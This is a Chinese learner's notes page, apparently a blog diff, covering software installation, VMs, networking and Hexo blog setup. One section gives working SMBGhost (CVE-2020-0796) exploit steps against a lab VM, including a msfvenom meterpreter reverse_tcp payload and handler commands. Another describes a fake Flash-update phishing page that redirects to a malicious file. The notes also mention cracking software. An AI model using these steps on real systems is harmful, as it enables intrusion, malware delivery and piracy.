+<h2 id="3、软件下载的方法补充"><a href="#3、软件下载的方法补充" class="headerlink" title="3、软件下载的方法补充"></a>3、软件下载的方法补充</h2><p>phpstudy<br />建议安装路径不要修改，默认安装在D盘<br />java22<br />记得选择安装路径，要求安装路径记得<br />python3.9</p>
+<ol>
+<li>加入path，自定义安装</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407591-8148aa12-2b4f-43c4-881b-f1ef6cebb4f2.png#averageHue=%23f9f7ef&id=UNdfY&originHeight=506&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>全勾</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608407859-6c6874f7-f8bb-43ce-a710-04ec3b3abed1.png#averageHue=%23f9f7f2&id=iqgcT&originHeight=502&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>前四个全勾，并选择安装位置</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408147-037cfa43-7a6b-4359-a684-7db69cff5b0c.png#averageHue=%23f8f6f0&id=uGK5P&originHeight=505&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>打开系统环境变量<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408420-0174f679-6eff-410f-bd30-2d6454ee168d.png#averageHue=%23f6f5f4&id=ZrRsO&originHeight=785&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408613-639d629d-4295-40d6-9a1d-a1f346f8fd95.png#averageHue=%23f6f5f3&id=GJmIP&originHeight=596&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>将python加入系统环境变量(复制粘贴)<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608408885-6a3fe541-8781-4173-9837-35aaa5ec1b1d.png#averageHue=%23f5f3f3&id=X2YQG&originHeight=664&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>确定，确定，重启电脑</li>
+</ol>
+<p>IDEA</p>
+<ol>
+<li>选择路径安装idea，全勾<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409029-719ab6c2-529f-4812-8657-c91ac1c2673f.png#averageHue=%23eeeded&id=eXjZw&originHeight=538&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>安装完成,关闭idea，以管理员身份运行激活包<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409220-32778f7e-bf1f-4ffd-9433-7205dccfb5be.png#averageHue=%23faf9f8&id=ihuGD&originHeight=746&originWidth=838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>激活完毕，重启电脑</li>
+<li>输入激活码</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409510-75adfba9-7578-42e7-a0d1-58ea6dee97c8.png#averageHue=%2330353b&id=oC09V&originHeight=667&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />bandzip(解压软件)</p>
+<ol>
+<li>正常安装，记得选择安装路径<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409766-ab529bc3-c155-43ff-b097-c7da53555202.png#averageHue=%23faf8f7&id=VkLzi&originHeight=124&originWidth=641&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>破解</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608409976-c11fa210-5f7e-4006-9f13-13d83dff4a50.png#averageHue=%23faf9f7&id=Ss0pr&originHeight=630&originWidth=1270&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>去广告，选项-设置<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410277-d5ee92ca-9699-4b7a-9747-c4b428610a01.png#averageHue=%23c2bb4a&id=jfkdn&originHeight=937&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+<p>vscode插件</p>
+<ol>
+<li>codeium<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410498-a91ad0d5-c0bf-4045-9b57-4ef4f4b152ec.png#averageHue=%232a5957&id=lORTx&originHeight=90&originWidth=93&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>chinese<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410653-e89e5e4f-5ec5-4477-9feb-d9844b91dae5.png#averageHue=%23252a31&id=hsNyX&originHeight=94&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>code runner<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608410831-bd1ea3ff-a36f-4922-b2e6-74ef260ec2c8.png#averageHue=%232f343e&id=v5ZfP&originHeight=84&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>ctrl+滚轮(调节字体大小)(需要设置)<br />待补充</li>
+</ol>
+<p>注：</p>
+<ol>
+<li>安装路径不要有中文</li>
+<li>最好不装在C盘</li>
+<li>安装路径不要有空格和符号(_除外)<br><a name="5UJj8"></a></li>
+</ol>
+<h2 id="4、虚拟机的使用"><a href="#4、虚拟机的使用" class="headerlink" title="4、虚拟机的使用"></a>4、虚拟机的使用</h2><p>在文件里找到文件所在位置后缀名为vmx的用VMware选定<br />我的widow10装在了G盘里的kail<br />我的kali装在了D盘里的kail，且里面还有2个镜像；<br />在使用虚拟机的时候滑轮和小键盘的数字键码不可以乱按容易乱码<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411069-a4d5cd40-5aaa-4cb1-9967-e6597d11506a.png#averageHue=%23f9f5f1&id=eIluG&originHeight=79&originWidth=80&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />虚拟机没网<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411284-2c294439-0de0-4ec0-9a9c-3ee88e3ef04c.png#averageHue=%23f7f6f5&id=r2fKT&originHeight=491&originWidth=1061&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />改成nqt<br />如果还没有网络<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411434-969e896f-9b56-4d76-b65f-beceb36ff048.png#averageHue=%23f0eeed&id=mHWjU&originHeight=157&originWidth=270&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />Jiu<br><a name="8iS0n"></a></p>
+<h2 id="5、重装系统"><a href="#5、重装系统" class="headerlink" title="5、重装系统"></a>5、重装系统</h2><p>在重装系统的时候要把下图全关闭，但以下图这个会容易几分钟自动检测重启，在激活系统前必做的事情<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411584-3d46a5fd-d175-43bb-b60c-13f74759f5f7.png#averageHue=%23f3f3f3&id=tqvuz&originHeight=304&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Aotog"></a></p>
+<h2 id="6-代理的购买与应用"><a href="#6-代理的购买与应用" class="headerlink" title="6 代理的购买与应用"></a>6 代理的购买与应用</h2><ol start="2">
+<li><p>购买代理</p>
+</li>
+<li><p>登录并注册账户<a target="_blank" rel="noopener" href="https://console.xenolink.net/#/register?code=vocvktBL">https://console.xenolink.net/#/register?code=vocvktBL</a><br /><a target="_blank" rel="noopener" href="https://console3.xenolk.com/#/register?code=vocvktBL">https://console3.xenolk.com/#/register?code=vocvktBL</a></p>
+</li>
+<li><p>选择第一个套餐</p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411769-1f1c6349-6955-4f75-91dd-876eeba316d0.png#averageHue=%23e7eae8&id=cu6FP&originHeight=470&originWidth=402&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+</li>
+<li><p>付款</p>
+</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608411986-67f30933-5cfd-4bd4-9a7f-e050e4550d26.png#averageHue=%23f2f1ec&id=WbyHO&originHeight=475&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>复制订阅<ol>
+<li><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412198-7b68b3ba-2084-4282-a90d-712e8b378b90.png#averageHue=%23f9f8f8&id=KjpPM&originHeight=818&originWidth=1178&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412577-aa68b115-87d8-413d-b7ff-8a481302e9e4.png#averageHue=%23f9f8f7&id=jgLhM&originHeight=1039&originWidth=1227&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412922-5bbf7acc-637f-4b61-97ab-c72acf196edd.png#averageHue=%23adb1a8&id=qSN0h&originHeight=1020&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413255-d16d0ae5-8100-4c6f-8452-4565d963aa6d.png#averageHue=%23f6f5f4&id=CiJBI&originHeight=809&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413638-c3147eb7-8bda-4b40-b615-8f8270099e95.png#averageHue=%23fbfafa&id=UskyN&originHeight=1281&originWidth=1372&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">google浏览器下载(<a target="_blank" rel="noopener" href="https://www.google.com/chrome/next-steps.html?brand=FKPE&statcb=1&installdataindex=empty&defaultbrowser=0">https://www.google.com/chrome/next-steps.html?brand=FKPE&statcb=1&installdataindex=empty&defaultbrowser=0#</a>)</li>
+<li>google安装SwitchyOmega插件<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413978-8c7abb1a-2c55-4718-b220-5ae14df90572.png#averageHue=%23a9d6c8&id=nkf69&originHeight=784&originWidth=779&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+</li>
+</ol>
+<p>7、电脑的购买讲解<br />电脑笔记本和台式一般都是组装机<br />一线品牌溢价严重但售后好<br />主看主板（蓝天3），主板坏了就没必要修了，核心，<br />Cpu(由频率决定)和显卡以及硬件内存（买电脑主要这几项）<br />硬盘固态最大装8t（4-5K）建议买4t和1t<br />内存条（32的）16、32（够用了）、64、96（48+48）、128（大部分电脑无法适配）<br />WiFi在同一个网络信号里最好的数字越大越好  如WiFi6<br />电脑由 硬件-驱动（windows系统多）-系统（坏了重装）-用户</p>
+<p>Windows使用  家庭（阉割） 专业（较好）   企业（最好的）  专业工作站（多开）<br />Windows最好装服务器版本   2003（xp）  2008（win7）  2012（win10）2018（win10）<br />大多数企业都用win7（2008）</p>
+<p><a name="OqOng"></a></p>
+<h3 id="1、工作需求"><a href="#1、工作需求" class="headerlink" title="1、工作需求"></a>1、工作需求</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414338-b26478ce-a87a-48e2-ad5c-b5a1c677a5f6.png#averageHue=%23374148&id=i0XWr&originHeight=452&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />打开qq 后Ctri+alt+f可翻译</p>
+<p><a name="AeDcb"></a></p>
+<h2 id="8、永恒之黑蓝屏"><a href="#8、永恒之黑蓝屏" class="headerlink" title="8、永恒之黑蓝屏"></a>8、永恒之黑蓝屏</h2><p><a name="qMvim"></a></p>
+<h3 id="1、poc（蓝屏））（观点验证脚本）"><a href="#1、poc（蓝屏））（观点验证脚本）" class="headerlink" title="1、poc（蓝屏））（观点验证脚本）"></a>1、poc（蓝屏））（观点验证脚本）</h3><p>先在window10虚拟机中的cmd中输入ipconfig查看IPiv4地址；在kali的虚拟机里的cmd中输入pip install ntlm_auth<br />等待一会输入  python .&#x2F;CVE-2020-0796.py 加攻击系统的IP地址回车即可<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414620-2f386c52-7a36-4911-8c96-e2536e887bf9.png#averageHue=%23fefefe&id=APOZb&originHeight=180&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><a name="AST17"></a></p>
+<h3 id="2、exp-rec"><a href="#2、exp-rec" class="headerlink" title="2、exp(rec)"></a>2、exp(rec)</h3><p>以下是操作流程<br />POC(蓝屏)<br /><a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br />使用<br />pip install ntlm_auth<br />python .&#x2F;CVE-2020-0796.py 192.168.30.134（写入widow10的IP）<br />EXP(RCE)<br /><a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br />msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;（这里写入的是kali的IP） LPORT&#x3D;5556 -b ‘\x00’ -i 5 -f python &gt; exploit<br />使用vim<br />vim exploit 回车<br />:%s&#x2F;buf&#x2F;USER_PAYLOAD 回车<br />:wq! 回车<br />将exploit内容替换到exploit.py<br />参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a><br />msfconsole<br />use exploit&#x2F;multi&#x2F;handler<br />set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br />show options<br />set lhost kali的ip（本机的IP）<br />set lport 5555<br />run<br />python exploit.py -ip 目标（虚拟机的ip）ip<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414849-572d99b6-7c92-4ce5-97ec-37779183b151.png#averageHue=%23fefefe&id=Xkzeo&originHeight=1022&originWidth=1054&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在第十二行的kali&#x3D;（这里输入kali终端的IP地址输入ifconfig即可在eth1的第二行）<br />上半部分开了一个终端下半部分也开了一个终端，开的两个终端，一个监控一个攻击</p>
+<p><a name="M824S"></a></p>
+<h2 id="9、计算机网络的讲解"><a href="#9、计算机网络的讲解" class="headerlink" title="9、计算机网络的讲解"></a>9、计算机网络的讲解</h2><p><a name="F7YE5"></a></p>
+<h2 id="1、电脑IP讲解"><a href="#1、电脑IP讲解" class="headerlink" title="1、电脑IP讲解"></a>1、电脑IP讲解</h2><p>两台电脑联网网线需要手动设置ip<br />广域网全球唯一<br />Ipv4范围0到255.255.255.255（2的八次方）每一都为256<br />扫c段（专业名词）不只扫的IP地址的c段指的是扫d段获取企业买了多少个IP<br />IP地址转换由内网ip通过nat转到公网ip然后出去（回来反之）<br />私网IP<br />A：10.0.0.0-10.255.255.255<br />B；172.16.0.0-172.31.255.255<br />C：192.168.0.0-192.168.255.255<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608415180-3047b3d1-c515-435f-8abb-7f84ea4bffd7.png#averageHue=%23e4e0cf&id=b3fPj&originHeight=395&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>http    省略：80<br />https   省略：443<br><a name="K8yRG"></a></p>
+<h2 id="2、扫描ip地址"><a href="#2、扫描ip地址" class="headerlink" title="2、扫描ip地址"></a>2、扫描ip地址</h2><p>在kali终端使用nmap -p 1-10 （加扫描ip地址）<br />如何查询地址ip–&gt;<a target="_blank" rel="noopener" href="https://x.threatbook.com/">https://x.threatbook.com/</a>在此链接里面可以查询IP地址（如以下图注意搜索的网站不带w和其他东西）<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720611376650-121a8601-15ca-44a9-a8f4-761b77f62515.png#averageHue=%23f3f3f2&clientId=u5199405e-cf93-4&from=paste&height=288&id=u6317a16c&originHeight=463&originWidth=572&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=47638&status=done&style=none&taskId=u567f0a8e-3ede-454b-a00a-338198afb38&title=&width=355.99078369140625" alt="image.png"><br><a name="qzSfy"></a></p>
+<h1 id="10、利用github搭建hexo博客"><a href="#10、利用github搭建hexo博客" class="headerlink" title="10、利用github搭建hexo博客"></a>10、利用github搭建hexo博客</h1><p><a name="VFd89"></a></p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><br /></h1><ol>
+<li>在本地找个目录放博客源文件，路径不要有中文</li>
+<li>在选定的目录中，右键<code>Git Bash Here</code></li>
+<li>使用npm命令安装Hexo，输入：</li>
+</ol>
+<blockquote>
+<p>npm install -g hexo-cli                     &#x2F;&#x2F;安装hexo<br />hexo init blog                                   &#x2F;&#x2F;初始化一个名为blog的项目<br />cd blog                                             &#x2F;&#x2F;进入blog<br />hexo g                                              &#x2F;&#x2F;编译构建</p>
+</blockquote>
+<p><a name="S7c2y"></a></p>
+<h1 id="1、准备前提"><a href="#1、准备前提" class="headerlink" title="1、准备前提"></a>1、准备前提</h1><p>在虚拟机里面操作完之后要将bolg文件复制到另外一个机器里之后再执行一遍红色的文字</p>
+<ol>
+<li>提前安装好(node.js)[<a target="_blank" rel="noopener" href="https://nodejs.org/en">https://nodejs.org/en</a>] 左边的那个</li>
+<li>提前安装好(GIt)[<a target="_blank" rel="noopener" href="https://git-scm.com/downloads">https://git-scm.com/downloads</a>]</li>
+<li>提前注册好一个github账号</li>
+<li>如果文章图片没有显示，请自行挂代理<br><a name="CWhwn"></a></li>
+</ol>
+<h1 id="2、操作步骤"><a href="#2、操作步骤" class="headerlink" title="2、操作步骤"></a>2、操作步骤</h1><ol>
+<li>在本地找个目录放博客源文件，路径不要有中文</li>
+<li>在选定的目录中，右键<code>Git Bash Here</code></li>
+<li>使用npm命令安装Hexo，输入：</li>
+</ol>
+<blockquote>
+<p>npm install -g hexo-cli                     &#x2F;&#x2F;安装hexo<br />hexo init blog                                   &#x2F;&#x2F;初始化一个名为blog的项目<br />cd blog                                             &#x2F;&#x2F;进入blog<br />hexo g                                              &#x2F;&#x2F;编译构建</p>
+</blockquote>
+<p>构建好的效果:<br /><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317116.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_23,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#id=flcc2&originHeight=389&originWidth=815&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="4">
+<li><p>cd进入这个目录<br />为了检测我们的网站雏形，分别按顺序输入以下三条命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site                    //博客新建一个文章</span><br><span class="line">hexo g                                   //构建</span><br><span class="line">hexo s                                   //启动服务</span><br><span class="line">之后就可以访问127.0.0.1:4000访问blog了</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置ssh</p>
+</li>
+</ol>
+<blockquote>
+<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥</p>
+</blockquote>
+<ul>
+<li>如果提示：No such file or directory 说明你是第一次使用git。</li>
+</ul>
+<blockquote>
+<p>ssh-keygen -t rsa -C “邮件地址”</p>
+</blockquote>
+<ul>
+<li>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317280.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_35,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#id=EKhuG&originHeight=529&originWidth=1234&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容 <br />● 尝试ssh连接,测试是否成功 </p>
+<p>ssh -T <a href="mailto:git@github.com">git@github.com</a> # 注意邮箱地址不用改</p>
+<p>●如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</p>
+<p>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>●在选中的位置(blog目录下)打开cmd(以管理员身份)</p>
+<p>npm install hexo-deployer-git –save</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1720595849698-166317e8-381d-4e54-88b5-d0a2a7ec7d5c.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23100605&from=url&id=FAJuc&originHeight=298&originWidth=543&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>●在上一个Git Bash Here还需要继续配置</p>
+<p>git config –global user.name “luozhixiaowo”&#x2F;&#x2F; 你的github用户名，非昵称 git config –global user.email  “<a href="mailto:xxx@qq.com">xxx@qq.com</a>“&#x2F;&#x2F; 填写你的github注册邮箱</p>
+<p>6准备上传代码</p>
+<p>● 在github上新建一个存储库，命名为github的用户名.github.io<br />● 编辑_config.yml文件，在最后改成这样 </p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317329.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_18,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=v0hJy&originHeight=257&originWidth=624&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>● 注意保持格式，缩进不对，会导致一会儿，上传不成功 <br />● 最后上传 </p>
+<p>hexo d每次上传成功之后，需要等待1-3分钟，用来刷新页面</p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303271424650.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_33,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=HZuTX&originHeight=741&originWidth=1159&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>●在创建的存储库的设置中-pages-如图设置 <br /><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303271424773.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_48,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=tgttM&originHeight=683&originWidth=1694&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="7">
+<li>hexo命令介绍</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo g == hexo generate #生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br><span class="line">hexo version  #查看Hexo的版本</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line"></span><br><span class="line">hexo s -g #生成并本地预览</span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>hexo目录结构</li>
+</ol>
+<blockquote>
+<p>+– .deploy      #hexo deploy生成的文件<br />+– node_modules  #npm组件<br />+– public        #生成的静态网页文件<br />+–scaffolds      #模板<br />+– source        #博客正文和其他源文件<br />|  +– _posts    #我们自己写的文章以md结尾<br />+– themes        #主题<br />+– _config.yml  #全局配置文件<br />– package.json  #定义了hexo所需要的各种模块</p>
+</blockquote>
+<ol start="9">
+<li>选择一个自己喜欢的主题，不知道有什么好用的主题可以直接，B站搜<code>HEXO主题</code><br />这里我用的是<a target="_blank" rel="noopener" href="http://yelog.org/2017/03/23/3-hexo-instruction/">3-hexo使用说明 | 叶落阁 (yelog.org)</a> </li>
+<li>关于如何写笔记看下一篇<a target="_blank" rel="noopener" href="https://sunwu57.github.io/2023/03/23/typora+PicGo+LskyPro+Obsidian%E5%AE%9E%E7%8E%B0%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86/">typora+PicGo+LskyPro+Obsidian实现文章管理</a> </li>
+<li><a target="_blank" rel="noopener" href="http://sunwu.world/2023/03/25/markdown%e7%9a%84%e4%bd%bf%e7%94%a8%e8%af%b4%e6%98%8e/">markdown语法实例</a></li>
+</ol>
+<p><a name="Jojie"></a></p>
+<h2 id="11、利用语雀在博客上-上传图片方便"><a href="#11、利用语雀在博客上-上传图片方便" class="headerlink" title="11、利用语雀在博客上 上传图片方便"></a>11、利用语雀在博客上 上传图片方便</h2><p><a name="WsTSt"></a></p>
+<h3 id="1、语雀上的操作"><a href="#1、语雀上的操作" class="headerlink" title="1、语雀上的操作"></a>1、语雀上的操作</h3><p>首先要在语雀的编辑好之后进行保存并共享之后，将语雀导出形式为.md形式文件之后，复制粘贴到新建博客文档即可上传。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720694306780-134f2110-9e69-40b5-9e04-bada505755a4.png#averageHue=%23fafafa&clientId=uea942ba3-acca-4&from=paste&height=213&id=u967335f8&originHeight=352&originWidth=761&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=35429&status=done&style=none&taskId=u19dd1ed8-e63f-4b73-b550-6dc1415d47d&title=&width=461.21209455478004" alt="image.png"><br><a name="cNi3y"></a></p>
+<h3 id="2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。"><a href="#2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。" class="headerlink" title="2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。"></a>2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。</h3><p>解决语雀防盗链<br />blog\node_modules\hexo-theme-landscape\layout_partial\head.ejs加入&#x2F;&#x2F;这个是找寻目的文档添加一段代码在前面找一处粘贴即可。<br /><meta name="referrer" content="no-referrer" />即可，解决图片无法加载的问题<br><a name="YMwr2"></a></p>
+<h2 id="12、falsh钓鱼"><a href="#12、falsh钓鱼" class="headerlink" title="12、falsh钓鱼"></a>12、falsh钓鱼</h2><p>意思是可以利用网站搭建一个网站但此网站只能在本机代表本机（127.0.0.1）查询（还不知道如和让其他的机器上搜索到）<br />及软件<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720696181075-54014a71-6056-4312-b773-474d0868a6e1.png#averageHue=%2360a7d6&clientId=uea942ba3-acca-4&from=paste&height=71&id=ub0af8cb9&originHeight=117&originWidth=131&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=17301&status=done&style=none&taskId=u127bbe85-5480-4fd9-bf22-266fcecece7&title=&width=79.39393480509355" alt="image.png">打开之后启动Apache2.4.39和MySqL5.7.26<br />文件G:\wanan\phpStudy\phpstudy_pro\WWW在这里</p>
+<p>用index做（ipgin.php）默认访问网页既不用大再打&#x2F;ipgin.php后面这一段进行查询<br><a name="ui2XK"></a></p>
+<h3 id="1、准备一个flash弹窗的js文件"><a href="#1、准备一个flash弹窗的js文件" class="headerlink" title="1、准备一个flash弹窗的js文件"></a>1、准备一个flash弹窗的js文件<br /><br /></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714218362424-a823fe48-808f-4413-816c-f74676a9471a.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_32,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp/resize,w_1118,limit_0#averageHue=%239da9a7&from=url&id=LC2sX&originHeight=520&originWidth=1118&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Q3Bns"></a></p>
+<h3 id="2、修改js文件中，立即升级的事件"><a href="#2、修改js文件中，立即升级的事件" class="headerlink" title="2、修改js文件中，立即升级的事件"></a><br />2、修改js文件中，立即升级的事件<br /><br /></h3><p>Python复制代码<br />1<br />&gt;&lt;divid&#x3D;’button’onclick&#x3D;window.location.href&#x3D;’http:&#x2F;&#x2F;服务器ip&#x2F;path&#x2F;恶意文件’&gt;</div></div></div>“<br><a name="KSWzq"></a></p>
